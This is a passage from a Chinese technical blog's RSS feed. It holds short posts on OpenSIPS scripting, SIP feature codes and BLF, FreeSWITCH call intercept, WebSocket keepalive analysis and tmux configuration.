&lt;li&gt;&lt;strong&gt;!~&lt;/strong&gt;  正则不匹配&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大于&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;= 大于等于&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&amp;lt;  小于&lt;/li&gt;
&lt;li&gt;&amp;lt;= 小于等于&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&amp;amp;&amp;amp;&lt;/strong&gt; 逻辑与&lt;/li&gt;
&lt;li&gt;**|| **逻辑或&lt;/li&gt;
&lt;li&gt;**! **逻辑非&lt;/li&gt;
&lt;li&gt;[ &amp;hellip; ] - test operator - inside can be any arithmetic expression&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;其他&#34;&gt;其他&lt;/h1&gt;
&lt;p&gt;出了常见的if语句，opensips还支持switch, while, for each, 因为用的比较少。各位可以看官方文档说明。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.opensips.org/Documentation/Script-Statements-2-4&#34;&gt;https://www.opensips.org/Documentation/Script-Statements-2-4&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用return语句减少逻辑嵌套</title>
      <link>https://wdd.js.org/opensips/ch5/return/</link>
      <pubDate>Tue, 23 Mar 2021 14:54:08 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/return/</guid>
      <description>&lt;p&gt;使用return(int)语句可以返回整数值。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;return(0) 相当于exit(), 后续的路由都不在执行&lt;/li&gt;
&lt;li&gt;return(正整数) 后续的路由还会继续执行，if测试为true&lt;/li&gt;
&lt;li&gt;return(负整数) 后续的路由还会继续执行, if测试为false&lt;/li&gt;
&lt;li&gt;可以使用 &lt;code&gt;$rc&lt;/code&gt; 或者 &lt;code&gt;$retcode&lt;/code&gt; 获取上一个路由的返回值&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 请求路由&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;check_is_feature_code&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;check_is_feature_code return code is &lt;/span&gt;$rc&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;some_other_check&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;check_is_feature_code&lt;span style=&#34;color:#f92672&#34;&gt;]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rU !~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^\*[0-9]+&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;check_is_feature_code: is not feature code &lt;/span&gt;$rU&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# 非feature code, 提前返回&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 下面就是feature code的处理&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ......
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;some_other_check&lt;span style=&#34;color:#f92672&#34;&gt;]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>核心变量说明</title>
      <link>https://wdd.js.org/opensips/ch5/core-var/</link>
      <pubDate>Tue, 23 Mar 2021 14:47:07 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/core-var/</guid>
      <description>&lt;h1 id=&#34;ru-ru&#34;&gt;$ru $rU&lt;/h1&gt;
&lt;p&gt;可读可写&lt;!-- raw HTML omitted --&gt;以下面的sip URL举例&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sip:8001@test.cc;a=1;b=2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;$ru 代表整个sip url就是 &lt;strong&gt;sip:8001@test.cc;a=1;b=2&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;$rU代表用户部分，就是&lt;strong&gt;8001&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;**&lt;/p&gt;
&lt;h1 id=&#34;du&#34;&gt;$du&lt;/h1&gt;
&lt;p&gt;可读可写&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$du = &amp;#34;sip:192.468.2.40&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;$du可以理解为外呼代理，我们想让这个请求发到下一个sip服务器，就把$du设置为下一跳的地址。&lt;/p&gt;</description>
    </item>
    <item>
      <title>网页分享到微信添加缩略图</title>
      <link>https://wdd.js.org/posts/2021/03/rggbsl/</link>
      <pubDate>Tue, 23 Mar 2021 10:53:15 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/rggbsl/</guid>
      <description>&lt;p&gt;header部分&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;property&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;og:image&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://abc.cc/x.jpg&amp;#34;&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;body部分&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;display:none&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://abc.cc/x.jpg&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意，图片的连接，必须是绝对地址。就是格式必需以http开头的地址，不能用相对地址，否则缩略图不会显示。&lt;/p&gt;</description>
    </item>
    <item>
      <title>websocket tcp keepalive 机制调研</title>
      <link>https://wdd.js.org/network/pz06t2/</link>
      <pubDate>Wed, 17 Mar 2021 19:17:46 +0800</pubDate>
      <guid>https://wdd.js.org/network/pz06t2/</guid>
      <description>&lt;p&gt;测试目标服务器 &lt;a href=&#34;http://www.websocket-test.com/&#34;&gt;http://www.websocket-test.com/&lt;/a&gt;， 该服务器使用的是未加密的ws协议。&lt;/p&gt;
&lt;p&gt;打开这个页面，可以看到这个页面发起了连接到ws://121.40.165.18:8800/ 的websocket连接。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/pz06t2/2022-10-29-18-35-36.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后看下里面的消息，都是服务端向客户端发送的消息。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/pz06t2/2022-10-29-18-35-51.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过wireshark分析&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/pz06t2/2022-10-29-18-36-01.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;单独的websocket也是能够看到服务端下发的消息的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/pz06t2/2022-10-29-18-36-20.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;keepalive-要点关注&#34;&gt;keepalive 要点关注&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;每隔大约45秒，客户端会像服务端发送一个keep alive包。服务端也会非常快的回复一个心跳包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/pz06t2/2022-10-29-18-36-43.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP feature codes SIP功能码</title>
      <link>https://wdd.js.org/opensips/ch9/feature-code/</link>
      <pubDate>Wed, 17 Mar 2021 10:57:45 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/feature-code/</guid>
      <description>&lt;h1 id=&#34;功能描述&#34;&gt;功能描述&lt;/h1&gt;
&lt;p&gt;用户可以拨打一个特殊的号码，用来触发特定的功能。&lt;!-- raw HTML omitted --&gt;常见的功能码一般以 &lt;code&gt;*&lt;/code&gt; 开头，例如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*1&lt;/code&gt; 组内代接&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*1(EXT)&lt;/code&gt; 代接指定的分机&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*2&lt;/code&gt; 呼叫转移&lt;/li&gt;
&lt;li&gt;&lt;code&gt;**87&lt;/code&gt; 请勿打扰&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面的栗子，具体的功能码，对应的业务逻辑是可配置的。&lt;/p&gt;
&lt;h1 id=&#34;场景举例&#34;&gt;场景举例&lt;/h1&gt;
&lt;p&gt;我的分机是8001，我看到8008的分机正在振铃，此时我需要把电话接起来。但是我不能走到8008的工位上去接电话，我必须要在自己的工位上接电话。&lt;/p&gt;
&lt;p&gt;那么我在自己的分机上输入&lt;!-- raw HTML omitted --&gt;&lt;code&gt;*18008&lt;/code&gt;  这时SIP服务端就知道你想代8008接听正在振铃的电话。&lt;/p&gt;
&lt;p&gt;说起来功能码就是一种使用话机上按键的一组暗号。&lt;/p&gt;
&lt;p&gt;话机上一般只有0-9*#，一共12个按键。没法办用其他的编码告诉服务端自己想做什么，所以只能用功能码。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.ipcomms.net/support/myoffice-pbx/feature-codes&#34;&gt;https://www.ipcomms.net/support/myoffice-pbx/feature-codes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/cucme/admin/configuration/manual/cmeadm/cmefacs.pdf&#34;&gt;https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/cucme/admin/configuration/manual/cmeadm/cmefacs.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://help.yeastar.com/en/s-series/topic/feature_code.html?hl=feature%2Ccode&amp;amp;_ga=2.76562834.622619423.1615949948-1155631884.1615949948&#34;&gt;https://help.yeastar.com/en/s-series/topic/feature_code.html?hl=feature%2Ccode&amp;amp;_ga=2.76562834.622619423.1615949948-1155631884.1615949948&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>FS intercept拦截</title>
      <link>https://wdd.js.org/freeswitch/intercept/</link>
      <pubDate>Mon, 15 Mar 2021 18:21:29 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/intercept/</guid>
      <description>&lt;p&gt;FS的 call pickup功能，就是用intercept功能。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个呼叫一般有两个leg,  intercept一般是把自己bridge其中一个leg，另外一个leg会挂断。
intercept默认是bridge legA, 挂断legB。通过参数也可以指定来bridge legB，挂断legA。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;从一个简单的场景说起。A拨打B分机。&lt;/p&gt;
&lt;p&gt;从FS的角度来说，有以下两条腿。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/freeswitch/intercept/2022-12-03-15-52-13.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过分析日志可以发现：具有replaces这种头的invite，fs没有走路由，而是直接用了intercept拦截。&lt;/p&gt;
&lt;p&gt;New Channel &lt;a href=&#34;mailto:sofia/external/8003@wdd.cc&#34;&gt;sofia/external/8003@wdd.cc&lt;/a&gt; [6ca5ed94-a5e5-492d-aaf7-782cecbaf7d1]&lt;!-- raw HTML omitted --&gt;2021-03-15 10:42:47.380797 [NOTICE] switch_channel.c:1118 New Channel &lt;a href=&#34;mailto:sofia/external/8001@wdd.cc&#34;&gt;sofia/external/8001@wdd.cc&lt;/a&gt; [34dc4095-3bac-4f7d-8be4-1ed5ed2f06b4]&lt;/p&gt;
&lt;p&gt;2021-03-15 10:42:51.520800 [NOTICE] switch_channel.c:1118 New Channel &lt;a href=&#34;mailto:sofia/external/8004@wdd.cc&#34;&gt;sofia/external/8004@wdd.cc&lt;/a&gt; [03e78837-1413-4b77-ba4c-e753fed55ebe]&lt;!-- raw HTML omitted --&gt;2021-03-15 10:42:51.520800 [DEBUG] switch_core_state_machine.c:585 (&lt;a href=&#34;mailto:sofia/external/8004@wdd.cc&#34;&gt;sofia/external/8004@wdd.cc&lt;/a&gt;) Running State Change CS_NEW (Cur 3 Tot 163)&lt;!-- raw HTML omitted --&gt;2021-03-15 10:42:51.520800 [DEBUG] sofia.c:10279 &lt;a href=&#34;mailto:sofia/external/8004@wdd.cc&#34;&gt;sofia/external/8004@wdd.cc&lt;/a&gt; receiving invite from 192.168.2.109:18627 version: 1.10.3-release  32bit&lt;!-- raw HTML omitted --&gt;2021-03-15 10:42:51.520800 [DEBUG] sofia.c:11640 call 6ca5ed94-a5e5-492d-aaf7-782cecbaf7d1 intercepted&lt;!-- raw HTML omitted --&gt;2021-03-15 10:42:51.520800 [DEBUG] sofia.c:7325 Channel &lt;a href=&#34;mailto:sofia/external/8004@wdd.cc&#34;&gt;sofia/external/8004@wdd.cc&lt;/a&gt; entering state [received][100]&lt;/p&gt;</description>
    </item>
    <item>
      <title>RFC阅读神器 rfcreader</title>
      <link>https://wdd.js.org/posts/2021/03/mcbqod/</link>
      <pubDate>Fri, 12 Mar 2021 13:04:57 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/mcbqod/</guid>
      <description>&lt;p&gt;rfc &lt;a href=&#34;http://www.rfcreader.com/#rfc5359&#34;&gt;http://www.rfcreader.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;rfcreader是一个在线的网站，可以阅读和搜索rfc文档。&lt;/p&gt;
&lt;p&gt;另外也具有一些非常好用的功能&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;支持账号登录，收藏自己喜欢的rfc文档&lt;/li&gt;
&lt;li&gt;可以对rfc进行标记，评论。&lt;/li&gt;
&lt;li&gt;有良好的目录&lt;/li&gt;
&lt;li&gt;支持书签&lt;/li&gt;
&lt;li&gt;等等。。。。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/03/mcbqod/2022-10-29-20-14-47.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>oh my tmux tmux的高级定制</title>
      <link>https://wdd.js.org/posts/2021/03/yroxga/</link>
      <pubDate>Thu, 11 Mar 2021 17:50:30 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/yroxga/</guid>
      <description>&lt;p&gt;参考： &lt;a href=&#34;https://github.com/gpakosz/.tmux&#34;&gt;https://github.com/gpakosz/.tmux&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;界面非常漂亮，有很多指示图标，能够实时的查看系统状态，session和window信息&lt;/li&gt;
&lt;li&gt;快捷键非常合理，非常好用&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;gitee.com&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;wangduanduan&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tmux.git
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv tmux .tmux
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ln &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;f .tmux&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;.tmux.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp .tmux&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;.tmux.conf.&lt;span style=&#34;color:#66d9ef&#34;&gt;local&lt;/span&gt; .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;微调配置&#34;&gt;微调配置&lt;/h1&gt;
&lt;h2 id=&#34;启用ctrla光标定位到行首&#34;&gt;启用ctrl+a光标定位到行首&lt;/h2&gt;
&lt;p&gt;默认情况下，ctrl+a被配置成和ctrl+b的功能相同，但是大多数场景下，ctrl+a是readline的光标回到行首的快捷键，&lt;/p&gt;
&lt;p&gt;所以我们需要恢复ctrl+a的原有功能。&lt;/p&gt;
&lt;p&gt;只需要把下面的两行取消注释&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set -gu prefix2      
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unbind C-a  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;复制模式支持jk上下移动&#34;&gt;复制模式支持jk上下移动&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set -g mode-keys vi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;在相同的目录打开新的窗口或者标签页&#34;&gt;在相同的目录打开新的窗口或者标签页&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmux_conf_new_window_retain_current_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmux_conf_new_pane_retain_current_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;隐藏系统运行时间信息&#34;&gt;隐藏系统运行时间信息&lt;/h2&gt;
&lt;p&gt;状态栏的系统运行时长似乎没什么用，可以隐藏&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmux_conf_theme_status_left&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; ❐ #S &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>BLF功能笔记</title>
      <link>https://wdd.js.org/opensips/ch9/blf-note/</link>
      <pubDate>Wed, 10 Mar 2021 13:15:45 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/blf-note/</guid>
      <description>&lt;h1 id=&#34;blf功能简介&#34;&gt;BLF功能简介&lt;/h1&gt;
&lt;p&gt;BLF是busy lamp field的缩写。一句话介绍就是，一个分机可以监控另一个分机的呼叫状态，状态可以通过分机上的指示灯来表示。&lt;/p&gt;
&lt;p&gt;例如：&lt;!-- raw HTML omitted --&gt;分机A通过配置过后，监控了分机B。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果分机B没有通话，那么分机A上的指示灯显示绿色&lt;/li&gt;
&lt;li&gt;如果分机B上有一个呼叫正在振铃，那么分机A指示灯红色灯闪烁&lt;/li&gt;
&lt;li&gt;如果分机B正在打电话，那么分机A的指示灯显示红色&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个功能的使用场景往往时例如秘书B监控了老板A的话机，在秘书把电话转给老板之前，可以通过自己电话上的指示灯，来判断老板有没有在打电话，如果没有再打电话，才可以把电话转过去。&lt;/p&gt;
&lt;h1 id=&#34;信令实现逻辑&#34;&gt;信令实现逻辑&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/blf-note/2022-12-03-20-35-36.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;信令分析&#34;&gt;信令分析&lt;/h1&gt;
&lt;h2 id=&#34;空闲通知&#34;&gt;空闲通知&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NOTIFY sip:8003@192.168.2.109:5060 SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Via: SIP/2.0/UDP 192.168.2.109:18627;branch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;z9hG4bKfef7.27d86e6.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;To: &amp;lt;sip:8003@wdd.cc&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
